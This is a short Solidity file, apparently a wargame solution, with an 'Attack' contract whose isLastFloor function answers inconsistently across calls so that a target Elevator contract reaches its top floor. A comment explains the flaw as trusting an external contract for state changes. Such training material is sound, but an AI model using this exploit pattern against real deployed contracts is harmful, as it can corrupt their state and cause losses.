// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface IElevator {
    function goTo(uint) external;
}

contract Attack {
    uint256 public count;

    function isLastFloor(uint256 _floor) public returns (bool) {
        if (count == 0 && _floor == 1) {
            count++;
            return false;
        }
        else {
            return true;
        }

    }

    function startAttack(address _target) public {
        IElevator(_target).goTo(1);
    }
}

/*
When goTo function is called in other contract, it will return false, so
if statement gets a true boolean, but count is increased by one. Therefore, when it 
is called a second time, it will return true, so top floor will be reached for the contract.
Depending on external contract functions for internal state changes is a huge vulnerability.
*/
